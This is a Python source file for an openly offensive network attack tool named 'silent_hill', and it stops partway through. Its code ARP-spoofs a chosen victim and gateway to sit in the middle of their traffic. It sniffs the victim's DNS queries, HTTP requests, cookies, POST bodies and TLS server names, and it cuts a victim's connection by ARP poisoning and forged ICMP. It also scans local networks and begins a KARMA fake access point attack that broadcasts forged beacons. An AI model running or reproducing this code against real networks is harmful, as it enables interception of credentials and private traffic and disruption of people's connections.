import requests, sys, argparse, ipaddress, subprocess, threading, time, os, socket, re, logging, signal, json, shutil, netifaces, random, itertools
import concurrent.futures
from scapy.all import *
from scapy.all import ARP, Ether, srp, ICMP, IP, sr1, conf, TCP, UDP, DNSQR, sniff, DNS, Dot11ProbeReq #, FTP, SMTP, Telnet, POP, IMAP, IPv6
from tqdm import tqdm 
from colorama import Fore, Style, init

########################## Banner & co ##########################
R = Fore.RED
C = Fore.CYAN
B = Fore.BLUE
G = Fore.GREEN
Y = Fore.YELLOW
M = Fore.MAGENTA
RESET = Style.RESET_ALL

banner = rf'''{R}
 ░▒▓███████▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░▒▓███████▓▒░▒▓████████▓▒░    
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░           
░▒▓█▓▒░      ░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░           
 ░▒▓██████▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓██████▓▒░ ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░         
       ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░    
       ░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░    
░▒▓███████▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░ ░▒▓█▓▒░    

            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓████████▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░        
            ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░▒▓████████▓▒░▒▓████████▓▒░ {Y}
                                            <raphaelthief> {RESET}
'''

Debug_display = f'''
{G}[+] Some examples of use{RESET}
    sudo python silent_hill.py -c -n 192.168.1.0/24
    sudo python silent_hill.py -d -n 192.168.1.0/24
    sudo python silent_hill.py -l -i wlan0
    sudo python silent_hill.py -s -i wlan0 -r 192.168.1.1 -t 192.168.1.93
    sudo python silent_hill.py -k -r 192.168.1.1 -i wlan0 -t 192.168.1.46
    sudo python silent_hill.py --karma-scan --karma-interface wlan0
    sudo python silent_hill.py --karma free_wifi --karma-interface wlan0 --karma-interface-internet wlan1 --karma-listen
    sudo python silent_hill.py --kill-karma

{G}[+] Show iptables rules{RESET}
    sudo iptables -L -v -n

{G}[+] Restore interface name{RESET}
    sudo ip link set wlan0mon name wlan0

{G}[+] Up & Down interface{RESET}
    sudo airmon-ng start wlan0
    sudo airmon-ng stop wlan0mon
    sudo services NetworkManager restart
    sudo reboot

{G}[+] Other{RESET}
    Just open the source code and RTFM
'''

########################## VARIABLES ##########################
# Pass error messages
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
requests.packages.urllib3.disable_warnings()

conf.verb = 0
IPINFO_TOKEN = None  # ipinfo.io token API if you want

WEB_PORTS = [80, 443, 8080, 8443]
OTHER_PORTS = {
    21: "FTP",
    22: "SSH",
    23: "Telnet",
    3389: "RDP",
    445: "SMB",
    3306: "MySQL",
    5432: "PostgreSQL",
    5900: "VNC"
}
PORTS = WEB_PORTS + list(OTHER_PORTS.keys())
seen_ips = set()
ip_info_cache = {}
found_hosts = []
seen_hosts = {}

victim_ip = ""
gateway_ip = ""
iface_spy = ""

victim_mac = None
gateway_mac = None

start_iface = ""

karma_interface = "" # Karma interface (monitor mode)
INTERNET_INTERFACE = "" # Internet access point (connected to network)
ESSID_fakeAP = "" # ESSID fake AP for karma attack
HOSTAPD_CONF = "/etc/hostapd/hostapd.conf"
DNSMASQ_CONF = "/etc/dnsmasq.conf"
SYSCTL_CONF = "/etc/sysctl.conf"
BACKUP_SUFFIX = ".backup_openap"
DNSMASQ_LEASES = "/var/lib/misc/dnsmasq.leases"

highlight_keywords_list = []

DWELL_TIME = 0.3
BROADCAST_BATCH_SIZE = 4
CHANNEL_LIST = [1, 6, 11]

seen_clients = set()
active_ssids = []
display_lock = threading.Lock()
probe_responses_seen = set()

# Less noisi but more detectable
FIXED_MACS = [
    "00:11:22:33:44:01",
    "C0:FF:EE:33:44:02",
    "DC:A6:32:33:44:03",
    "DE:AD:BE:33:44:04"
]

stop_event = threading.Event()

def signal_handler(sig, frame): # Ctrl+C cleint discovery & scanning stuff
    print(f"\n[*] {R}Ctrl + C detected. Closing ...{RESET}")
    restore_arp()
    sys.exit(0)

def signal_handler2(sig, frame): # Ctrl+C kill client connexion ARP
    print(f"\n[*] {R}Ctrl + C detected. Closing ...{RESET}")
    restore_arp()
    # Clean up ebtables rules if possible
    os.system(f"ebtables -D OUTPUT -p IPv4 --ip-src {victim_ip} -j DROP")
    os.system(f"ebtables -D FORWARD -p IPv4 --ip-src {victim_ip} -j DROP")
    print(f"[*] Ebtables rules removed{RESET}")
    sys.exit(0)

def signal_handler3(sig, frame):  # Ctrl+C handler
    print(f"\n[*] {R}Ctrl + C detected. Stopping threads...{RESET}")
    stop_event.set()  # Kill all threads
    restore_interface(start_iface, "karma_off")
    sys.exit(0)

def load_oui(file_path): # Manufacturer (from MAC adress) file oui.txt
    oui_map = {}
    download_oui("oui.txt")
    try:
        with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
            for line in f:
                if "(hex)" in line:
                    parts = line.split()
                    if len(parts) >= 3:
                        prefix = parts[0].replace("-", "")
                        vendor = " ".join(parts[2:])
                        oui_map[prefix] = vendor.strip()
    except FileNotFoundError:
        print(f"[!] {R}OUI file not found:", file_path, RESET)
    return oui_map

def download_oui(file_path="oui.txt"):
    if not os.path.exists(file_path):
        print("[*] Downloading OUI database...")
        url = "https://standards-oui.ieee.org/oui/oui.txt"
        try:
            r = requests.get(url)
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(r.text)
            print("[+] OUI file downloaded successfully.")
        except Exception as e:
            print(f"[!] {R}Failed to download OUI file: {e}{RESET}")

def current_time():
    return "[" + time.strftime("%H:%M:%S") + "]"

def highlight_keywords(text):
    if not highlight_keywords_list:
        return text

    for word in highlight_keywords_list:
        if word in text.lower():
            # Remplace insensible à la casse
            pattern = re.compile(re.escape(word), re.IGNORECASE)
            text = pattern.sub(f"{R}\\g<0>{Y}", text)
    return text

########################## SPY MODE (--spy) ##########################
def get_mac(ip):
    ans, _ = sr(ARP(pdst=ip), timeout=2, verbose=0)
    for _, rcv in ans:
        return rcv.hwsrc
    return None

# Setup passive MITM config
def enable_ip_forwarding():
    print("[*] Enabling IP forwarding and setting up clean NAT ...")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")
    os.system("iptables -t nat -D POSTROUTING -o {} -j MASQUERADE 2>/dev/null".format(iface_spy))
    os.system("iptables -t nat -A POSTROUTING -o {} -j MASQUERADE".format(iface_spy))

def spoof():
    global victim_mac, gateway_mac
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    if not victim_mac or not gateway_mac:
        print(f"[-] {R}MAC not found. Exiting{RESET}")
        exit(1)

    print("[*] Starting ARP spoofing...")
    try:
        while True:
            pkt_to_victim = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac)
            pkt_to_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac)
            sendp(pkt_to_victim, iface=iface_spy, verbose=0)
            sendp(pkt_to_gateway, iface=iface_spy, verbose=0)
            time.sleep(2)
    except KeyboardInterrupt:
        pass

# Restore ARP tables
def restore_arp():
    print("[!] Restoring ARP tables...")
    if victim_mac and gateway_mac:
        sendp(Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=gateway_mac), count=5, iface=iface_spy, verbose=0)
        sendp(Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=victim_mac), count=5, iface=iface_spy, verbose=0)

def get_ip_info(ip):
    if ip in ip_info_cache:
        return ip_info_cache[ip]

    # 1. Reverse DNS
    # Try this method not rate limited
    try:
        hostname, _, _ = socket.gethostbyaddr(ip)
        if hostname and hostname != ip:
            ip_info_cache[ip] = hostname
            return hostname + f" {RESET}(local reverse DNS)"
    except socket.herror:
        pass  # No reverse DNS found, try ipinfo

    # 2. Fallback to ipinfo.io
    # Can be rate limited (you can add API key --> IPINFO_TOKEN)
    try:
        url = f"https://ipinfo.io/{ip}"
        if IPINFO_TOKEN:
            url += f"?token={IPINFO_TOKEN}"
        output = subprocess.check_output(["curl", "-s", url], timeout=5).decode()
        data = json.loads(output)
        hostname = data.get("hostname", "").strip()
        org = data.get("org", "").strip()

        result = hostname if hostname and hostname != ip else org # Get hostname or org datas from the IP
        ip_info_cache[ip] = result if result else None
        return result
    except Exception:
        ip_info_cache[ip] = None
        return None

def process_packet(packet): # [DNS] packets
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        queried = packet[DNSQR].qname.decode(errors="ignore")
        highlighted = highlight_keywords(queried)
        print(f"{current_time()} - {Y}[DNS]{RESET} {packet[IP].src} → {packet[IP].dst} : {Y}{highlighted}{RESET}")



def process_http_packet(packet):
    if packet.haslayer(TCP) and packet.haslayer(Raw):
        http_data = packet[Raw].load.decode(errors='ignore')
        if "Host:" in http_data:
            lines = http_data.split('\r\n')
            print(f"{current_time()} - {C}[HTTP]{RESET} request intercepted:{RESET}")
            for line in lines:
                if line.startswith(('GET', 'POST', 'PUT', 'DELETE')):
                    print(f"              {C}↪️{RESET}  Request Line: {Y}{line}{RESET}")
                elif line.startswith("Host:"):
                    print(f"              {C}↪️{RESET}  Host: {Y}{line[6:]}{RESET}")
                elif line.startswith("User-Agent:"):
                    print(f"              {C}↪️{RESET}  User-Agent: {Y}{line[12:]}{RESET}")
                elif line.lower().startswith("cookie:"):
                    print(f"              {C}↪️{RESET}  Cookie: {Y}{line[8:]}{RESET}")
            
            # POST datas
            if "POST" in http_data and "\r\n\r\n" in http_data:
                _, body = http_data.split("\r\n\r\n", 1)
                if body.strip():
                    print(f"{current_time()} - {C}[HTTP]{RESET} POST Body:{RESET}")
                    print(f"{Y}{body}")

def extract_sni(packet): # [TLS] packets
    try:
        if packet.haslayer(TCP) and packet.haslayer(Raw) and packet[TCP].dport == 443:
            data = bytes(packet[Raw].load)
            if data[0] == 0x16 and data[5] == 0x01:
                session_id_len = data[43]
                idx = 44 + session_id_len
                cipher_suites_len = int.from_bytes(data[idx:idx+2], byteorder="big")
                idx += 2 + cipher_suites_len
                compression_methods_len = data[idx]
                idx += 1 + compression_methods_len
                extensions_len = int.from_bytes(data[idx:idx+2], byteorder="big")
                idx += 2
                end = idx + extensions_len

                while idx + 4 <= end:
                    ext_type = int.from_bytes(data[idx:idx+2], "big")
                    ext_len = int.from_bytes(data[idx+2:idx+4], "big")
                    idx += 4
                    if ext_type == 0:  # SNI
                        sni_len = int.from_bytes(data[idx+3:idx+5], "big")
                        sni = data[idx+5:idx+5+sni_len].decode("utf-8", errors="ignore")
                        
                        highlighted = highlight_keywords(sni)
                        print(f"{current_time()} - {R}[TLS]{RESET} {packet[IP].src} SNI: {Y}{highlighted}{RESET}")
                        return True  # SNI found
                    idx += ext_len
    except Exception:
        pass
    return False

def handle_external_ip(ip): # [IP] packets --> External IP adresses : try to get DNS name
    if ip.startswith("192.168.") or ip.startswith("10.") or ip.startswith("172."):
        return  # local IP
    if ip not in seen_ips:
        seen_ips.add(ip)
        info = get_ip_info(ip)
        if info:
            highlighted = highlight_keywords(info.strip())
            print(f"{current_time()} - {G}[IP]{RESET} External IP detected: {ip} --> {Y}{highlighted}{RESET}") # Info found
        else:
            print(f"{current_time()} - {G}[IP]{RESET} External IP detected: {ip}") # Info not found, just display the external IP


def process_cleartext_protocols(packet):
    try:
        if packet.haslayer(ICMP):
            icmp_type = packet[ICMP].type
            icmp_code = packet[ICMP].code
            print(f"{current_time()} - {M}[ICMP]{RESET} {packet[IP].src} → {Y}{packet[IP].dst}{RESET} | Type: {Y}{icmp_type}{RESET} Code: {Y}{icmp_code}{RESET}")
            return

        if packet.haslayer(IPv6):
            src = packet[IPv6].src
            dst = packet[IPv6].dst
            print(f"{current_time()} - {G}[IPv6]{RESET} Packet: {src} → {Y}{dst}{RESET}")
            return

        if packet.haslayer(TCP):
            sport = packet[TCP].sport
            dport = packet[TCP].dport
            raw = packet.getlayer(Raw)
            payload = raw.load.decode(errors='ignore') if raw else ""
            clean_payload = payload.rstrip()

            tcp_protocols = {
                20: "FTP-data",
                21: "FTP",
                23: "Telnet",
                25: "SMTP",
                79: "Finger",
                110: "POP3",
                143: "IMAP",
                194: "IRC",
                513: "Rlogin",
                8080: "HTTP-Proxy",
                1755: "MMS",
                # X11 ports range 6000-6063
            }

            if 6000 <= sport <= 6063 or 6000 <= dport <= 6063:
                proto = "X11"
            else:
                proto = tcp_protocols.get(sport) or tcp_protocols.get(dport)

            if proto and payload:
                highlighted = highlight_keywords(clean_payload)
                print(f"{current_time()} - {M}[{proto}]{RESET} Payload: {Y}{highlighted}{RESET}")

        elif packet.haslayer(UDP):
            sport = packet[UDP].sport
            dport = packet[UDP].dport
            raw = packet.getlayer(Raw)
            payload = raw.load.decode(errors='ignore') if raw else ""
            clean_payload = payload.rstrip()

            udp_protocols = {
                7: "Echo",
                13: "Daytime",
                19: "Chargen",
                69: "TFTP",
                123: "NTP",
                137: "NetBIOS-Name",
                138: "NetBIOS-Datagram",
                139: "NetBIOS-Session",
                161: "SNMP",
                162: "SNMP-Trap",
                389: "LDAP",
                5060: "SIP",
                520: "RIP",
            }

            proto = udp_protocols.get(sport) or udp_protocols.get(dport)

            if proto and payload:
                highlighted = highlight_keywords(clean_payload)
                print(f"{current_time()} - {M}[{proto}]{RESET} Payload: {Y}{highlighted}{RESET}")
    except Exception:
        pass

def sniff_dns(): # Sniff source & destinations packets from the target
    print("[*] Sniffing DNS, HTTP, and TLS traffic...")

    def handle_packet(packet):
        if IP not in packet:
            return

        src = packet[IP].src
        dst = packet[IP].dst

        process_packet(packet)
        process_http_packet(packet)
        sni_found = extract_sni(packet)

        # Log external IP if no SNI/DNS is visible
        if packet.haslayer(UDP) or packet.haslayer(TCP) or packet.haslayer(IPv6):
            for ip in [src, dst]:
                if ip != victim_ip or not ip.startswith("fe80"):
                    handle_external_ip(ip)

        process_cleartext_protocols(packet)

    sniff(filter=f"(ip src {victim_ip} or ip dst {victim_ip})", prn=handle_packet, store=0, iface=iface_spy) # Source + Destination filter

########################## CONNECT DISCOVERY MODE (--connect) ##########################
def scan_host(ip):
    ip_str = str(ip)
    reachable = False
    open_ports = []
    titles = []
    services = []

    for port in PORTS:
        try:
            with socket.create_connection((ip_str, port), timeout=2):
                reachable = True
                open_ports.append(port)
        except:
            continue

    if reachable:
        for port in open_ports:
            if port in WEB_PORTS:
                proto = "https" if port in [443, 8443] else "http" # Display HTTPS or HTTP reachable target
                url = f"{proto}://{ip_str}:{port}"
                try:
                    resp = requests.get(url, timeout=2, verify=False, allow_redirects=True)
                    title = "Untitled page"
                    if "<title>" in resp.text.lower():
                        start = resp.text.lower().find("<title>") + 7
                        end = resp.text.lower().find("</title>")
                        title = resp.text[start:end].strip()
                    titles.append(title)
                    services.append("HTTP/HTTPS")
                except:
                    titles.append("Not accessible")
                    services.append("HTTP/HTTPS")
            else:
                service_name = OTHER_PORTS.get(port, "Unknown")
                titles.append("N/A")
                services.append(service_name)

        found_hosts.append((ip_str, open_ports, services, titles))
        print(f"{G}[+] {Y}{ip_str}{RESET} | Ports: {open_ports} | Services: {services} | Infos: {titles}")

########################## PASSIVE LISTEN MODE (--listen) ##########################
def get_oui(mac, oui_map):
    if not mac:
        return "?"
    prefix = mac.upper().replace(":", "").replace("-", "")[:6]
    return oui_map.get(prefix, "Unknown")

def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except:
        return None

def packet_handler(pkt):
    ip = None
    mac = None
    hostname = None
    proto = None
    ports = None
    dns_queries = []

    # ARP
    if ARP in pkt and pkt[ARP].op in (1, 2):
        ip = pkt[ARP].psrc
        mac = pkt[ARP].hwsrc
    # IP
    elif IP in pkt:
        ip = pkt[IP].src
        proto_num = pkt[IP].proto
        proto = {
    0: "HOPOPT",
    1: "ICMP",
    2: "IGMP",
    3: "GGP",
    4: "IPv4",
    5: "ST",
    6: "TCP",
    7: "CBT",
    8: "EGP",
    9: "IGP",
    10: "BBN-RCC-MON",
    11: "NVP-II",
    12: "PUP",
    13: "ARGUS",
    14: "EMCON",
    15: "XNET",
    16: "CHAOS",
    17: "UDP",
    18: "MUX",
    19: "DCN-MEAS",
    20: "HMP",
    21: "PRM",
    22: "XNS-IDP",
    23: "TRUNK-1",
    24: "TRUNK-2",
    25: "LEAF-1",
    26: "LEAF-2",
    27: "RDP",
    28: "IRTP",
    29: "ISO-TP4",
    30: "NETBLT",
    31: "MFE-NSP",
    32: "MERIT-INP",
    33: "DCCP",
    34: "3PC",
    35: "IDPR",
    36: "XTP",
    37: "DDP",
    38: "IDPR-CMTP",
    39: "TP++",
    40: "IL",
    41: "IPv6",
    42: "SDRP",
    43: "IPv6-Route",
    44: "IPv6-Frag",
    45: "IDRP",
    46: "RSVP",
    47: "GRE",
    48: "DSR",
    49: "BNA",
    50: "ESP",
    51: "AH",
    52: "I-NLSP",
    53: "SWIPE",
    54: "NARP",
    55: "MOBILE",
    56: "TLSP",
    57: "SKIP",
    58: "IPv6-ICMP",
    59: "IPv6-NoNxt",
    60: "IPv6-Opts",
    61: "Any Host Internal Protocol",
    62: "CFTP",
    63: "Any Local Network",
    64: "SAT-EXPAK",
    65: "KRYPTOLAN",
    66: "RVD",
    67: "IPPC",
    68: "Distributed File System",
    69: "SAT-MON",
    70: "VISA",
    71: "IPCV",
    72: "CPNX",
    73: "CPHB",
    74: "WSN",
    75: "PVP",
    76: "BR-SAT-MON",
    77: "SUN-ND",
    78: "WB-MON",
    79: "WB-EXPAK",
    80: "ISO-IP",
    81: "VMTP",
    82: "SECURE-VMTP",
    83: "VINES",
    84: "TTP",
    85: "NSFNET-IGP",
    86: "DGP",
    87: "TCF",
    88: "EIGRP",
    89: "OSPF",
    90: "Sprite-RPC",
    91: "LARP",
    92: "MTP",
    93: "AX.25",
    94: "IPIP",
    95: "MICP",
    96: "SCC-SP",
    97: "ETHERIP",
    98: "ENCAP",
    99: "Any Private Encryption Scheme",
    100: "GMTP",
    101: "IFMP",
    102: "PNNI",
    103: "PIM",
    104: "ARIS",
    105: "SCPS",
    106: "QNX",
    107: "A/N",
    108: "IPComp",
    109: "SNP",
    110: "Compaq-Peer",
    111: "IPX-in-IP",
    112: "VRRP",
    113: "PGM",
    114: "Any 0-hop Protocol",
    115: "L2TP",
    116: "DDX",
    117: "IATP",
    118: "STP",
    119: "SRP",
    120: "UTI",
    121: "SMP",
    122: "SM",
    123: "PTP",
    124: "ISIS over IPv4",
    125: "FIRE",
    126: "CRTP",
    127: "CRUDP",
    128: "SSCOPMCE",
    129: "IPLT",
    130: "SPS",
    131: "PIPE",
    132: "SCTP",
    133: "FC",
    134: "RSVP-E2E-IGNORE",
    135: "Mobility Header",
    136: "UDPLite",
    137: "MPLS-in-IP",
    138: "manet",
    139: "HIP",
    140: "Shim6",
    141: "WESP",
    142: "ROHC",
    255: "Reserved",
}.get(proto_num, f"Unknown({proto_num})")

        # Ports if TCP/UDP
        if TCP in pkt:
            ports = (pkt[TCP].sport, pkt[TCP].dport)
        elif UDP in pkt:
            ports = (pkt[UDP].sport, pkt[UDP].dport)

        # DNS query
        if DNS in pkt and pkt[DNS].qr == 0:  # DNS request
            try:
                dns_queries.append(pkt[DNSQR].qname.decode())
            except:
                pass

    if ip and ip not in seen_hosts:
        hostname = get_hostname(ip) or "?"

        oui_map = load_oui("oui.txt")
        if not oui_map:
            print("[!] OUI database empty or not found")

        info = {
            "hostname": hostname,
            "first_seen": time.strftime("%H:%M:%S"),
            "mac": mac or "?",            
            "oui": get_oui(mac, oui_map) if mac else "?",
            "proto": proto or "?",
            "ports": ports or "?",
            "dns_queries": dns_queries
        }
        seen_hosts[ip] = info
        print(f"{G}[+] {Y}{ip:15}{RESET} | Hostname: {info['hostname']:25} | MAC: {info['mac']:17} | OUI: {info['oui']:10} | Proto: {info['proto']:5} | Ports: {info['ports']}") # Screen display during the search

        if dns_queries:
            print(f"--> DNS queries: {', '.join(dns_queries)}")

def print_summary():
    while True:
        os.system("clear")
        print(f"\n{C}=== Seen devices ==={RESET}")
        for ip, info in seen_hosts.items():
            print(f"{Y}{ip:15}{RESET} | {C}{info['hostname']:60}{RESET} | MAC: {info['mac']:20} | OUI: {C}{info['oui']:20}{RESET} | Proto: {info['proto']:5} | Ports: {info['ports']}") # Final screen display after search
            if info['dns_queries']:
                print(f"--> DNS queries: {', '.join(info['dns_queries'])}")
        time.sleep(10)

def get_vendor(mac, oui_map):
    if not mac or not oui_map:
        return None
    prefix = mac.upper().replace(":", "")[:6]
    return oui_map.get(prefix)

def get_hostname(ip):
    try:
        return socket.gethostbyaddr(ip)[0]
    except socket.herror:
        return None

########################## DISCOVERY MODE (--discovery) ##########################
def arp_scan(network, iface, oui_map):
    print("[*] Starting ARP scan on", network)
    arp = ARP(pdst=network)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    ans, _ = srp(packet, timeout=3, iface=iface, verbose=0)
    devices = []
    for _, received in ans:
        vendor = get_vendor(received.hwsrc, oui_map)
        hostname = get_hostname(received.psrc)
        devices.append({
            'ip': received.psrc,
            'mac': received.hwsrc,
            'vendor': vendor,
            'hostname': hostname
        })
    return devices

def icmp_ping(ip, timeout=1):
    subprocess.run(["ping", "-c", "1", "-W", "1", ip], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    pkt = IP(dst=ip)/ICMP()
    resp = sr1(pkt, timeout=timeout, verbose=0)
    return resp is not None

def icmp_scan(network, max_workers=25):
    print("[*] Starting ICMP (ping) scan ...")
    ips = list(ipaddress.IPv4Network(network).hosts())
    alive_hosts = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(icmp_ping, str(ip)): str(ip) for ip in ips}
        for future in tqdm(concurrent.futures.as_completed(futures), total=len(futures), desc="", unit="ip"):
            ip = futures[future]
            try:
                if future.result():
                    alive_hosts.append(ip)
            except Exception:
                pass
    return alive_hosts

def tcp_syn_scan(ip, ports=[80, 443, 22], timeout=1):
    for port in ports:
        pkt = IP(dst=ip)/TCP(dport=port, flags='S')
        resp = sr1(pkt, timeout=timeout, verbose=0)
        if resp and resp.haslayer(TCP) and resp[TCP].flags == 0x12:
            return True
    return False

def ssdp_discover(timeout=3):
    print("[*] SSDP discovery ...")
    msg = (
        'M-SEARCH * HTTP/1.1\r\n'
        'HOST: 239.255.255.250:1900\r\n'
        'MAN: "ssdp:discover"\r\n'
        'MX: 2\r\n'
        'ST: ssdp:all\r\n\r\n'
    )
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
    sock.settimeout(timeout)
    sock.sendto(msg.encode(), ("239.255.255.250", 1900))
    results = []
    try:
        while True:
            data, addr = sock.recvfrom(65507)
            if addr[0] not in results:
                print(f"{G}[+]{RESET} SSDP: {Y}{addr[0]}{RESET}")
                results.append(addr[0])
    except socket.timeout:
        pass
    sock.close()
    return results

def get_netbios_info(ip):
    try:
        output = subprocess.check_output(["nbtscan", "-v", ip], stderr=subprocess.DEVNULL)
        decoded = output.decode()
        name_match = re.search(r"^(\S+)\s+<00>\s+UNIQUE", decoded, re.MULTILINE)
        mac_match = re.search(r"Adapter address:\s*([0-9a-f:]{17})", decoded, re.IGNORECASE)
        name = name_match.group(1) if name_match else None
        mac = mac_match.group(1).lower() if mac_match else None
        return name, mac
    except subprocess.CalledProcessError:
        return None, None

def get_snmp_sysinfo(ip, community="public"):
    try:
        output = subprocess.check_output(["snmpget", "-v1", "-c", community, ip, "1.3.6.1.2.1.1.1.0"], stderr=subprocess.DEVNULL)
        return output.decode().strip()
    except subprocess.CalledProcessError:
        return None

########################## KILL CONNEXION MODE (--kill) ##########################
def kill_connection():
    global victim_mac, gateway_mac
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    if not victim_mac or not gateway_mac:
        print(f"[-] {R}MAC not found. Exiting{RESET}")
        exit(1)

    print("[*] ARP spoof with KILL mode: Killing target connexion ...")

    # Disable IP forwarding to block the MITM
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

    # Fake MAC address for blackhole (no host should have it)
    blackhole_mac = "00:00:00:00:00:00"

    # Attempt to block packets at the Ethernet level (if ebtables is available)
    try:
        os.system(f"ebtables -A OUTPUT -p IPv4 --ip-src {victim_ip} -j DROP")
        os.system(f"ebtables -A FORWARD -p IPv4 --ip-src {victim_ip} -j DROP")
        print("[*] ebtables: rules set")
    except Exception:
        print(f"[!] {R}ebtables not disponible ... Check installation{RESET}")

    try:
        print(f"[*] {Y}Attack running ...{RESET}")
        while True:
            # ARP poisoning with blackhole MAC
            pkt_to_victim = Ether(dst=victim_mac)/ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwsrc=blackhole_mac, hwdst=victim_mac)
            pkt_to_gateway = Ether(dst=gateway_mac)/ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwsrc=blackhole_mac, hwdst=gateway_mac)

            sendp(pkt_to_victim, iface=iface_spy, verbose=0)
            sendp(pkt_to_gateway, iface=iface_spy, verbose=0)

            # Send an ICMP Host Unreachable to force the connection to drop
            icmp_unreachable = IP(dst=victim_ip, src=gateway_ip)/ICMP(type=3, code=1)
            send(icmp_unreachable, verbose=0)

            time.sleep(1)
    except KeyboardInterrupt:
        print(f"\n[*] {R}Ctrl + C detected. Closing ...{RESET}")
        restore_arp()
        # Clean up ebtables rules if possible
        os.system(f"ebtables -D OUTPUT -p IPv4 --ip-src {victim_ip} -j DROP")
        os.system(f"ebtables -D FORWARD -p IPv4 --ip-src {victim_ip} -j DROP")
        print("[*] Ebtables rules removed")
        sys.exit(0)

########################## KAMRMA SCANNER ##########################
def set_monitor_mode(interface, karma_mode):
    print(f"[*] Enabling monitor mode on {interface}...")

    try:
        out = subprocess.check_output(
            ["sudo", "airmon-ng", "start", interface],
            text=True, stderr=subprocess.STDOUT
        )
        # Stop interfering processes (like NetworkManager)
        if karma_mode == "karma_on":
            pass
        elif karma_mode == "karma_off":
            subprocess.call(["airmon-ng", "check", "kill"])

    except subprocess.CalledProcessError as e:
        print(f"[!] {R}Auto use of airmon on interface failed :\n{e.output.strip()}")
        print(f"{RESET}[!] {R}Try the manual way !{RESET}")
        exit(1)

    # ---------- 1)  Try to read monitor mode in the output ----------
    regexes = [
        r'on\s+\[[^\]]+\](\w+mon)\b',          # mac80211 format
        r'monitor mode enabled on (\w+mon)\b', # old format
        r'\(monitor mode enabled\)',
    ]

    for rgx in regexes:
        m = re.search(rgx, out)
        if m:
            if m.groups():
                interface = m.group(1)
            break

    # ---------- 2)  Fallback : maybe already on mon mode ----------
    if not m:
        try:
            info = subprocess.check_output(["iw", "dev", interface, "info"], text=True)
            if re.search(r'\btype\s+monitor\b', info):
                pass
            else:
                raise ValueError("not monitor yet")
        except Exception:
            # ---------- 3)  Scann all interfaces *mon -------------
            try:
                info = subprocess.check_output(["iw", "dev", interface, "info"], text=True)
                mode = re.search(r'\btype\s+(\w+)', info)
                if mode and mode.group(1) != "monitor":
                    raise ValueError(f"[!] {interface} is {mode.group(1)}, not monitor")            
            
            except Exception as e:
                print(f"[!] {R}Auto use of airmon on interface failed : \n{e}")
                print(f"{RESET}[!] {R}Try the manual way !{RESET}")
                exit(1)
    return interface

def restore_interface(interface, karma_mode):
    print(f"[*] Restoring interface {interface} to managed mode...")
    subprocess.call(["airmon-ng", "stop", interface])

    if karma_mode == "karma_on":
        pass
    elif karma_mode == "karma_off":
        subprocess.call(["service", "NetworkManager", "restart"])

def channel_hopper(scan_INTERFACE):
    try:
        while True:
            for ch in range(1, 14):
                os.system(f"iwconfig {scan_INTERFACE} channel {ch}")
                time.sleep(0.3)
    except KeyboardInterrupt:
        pass

def load_essid_list(path):
    with open(path, "r", encoding="utf-8", errors="ignore") as f:
        return [line.strip() for line in f if line.strip()]

ESSID_LIST = load_essid_list("ESSID.txt")

# Cannal hoping
def set_channel(interface, channel):
    os.system(f"iwconfig {interface} channel {channel}")

# Trame beacon
def generate_beacon(ssid, mac):
    dot11 = Dot11(type=0, subtype=8, addr1="ff:ff:ff:ff:ff:ff", addr2=mac, addr3=mac)
    beacon = Dot11Beacon(cap='ESS')
    essid = Dot11Elt(ID='SSID', info=ssid)
    rates = Dot11Elt(ID='Rates', info=b'\x82\x84\x8b\x96')
    frame = RadioTap()/dot11/beacon/essid/rates
    return frame

# Display infos
def clear_terminal():
    os.system('clear')

def display_status():
    with display_lock:
        clear_terminal()
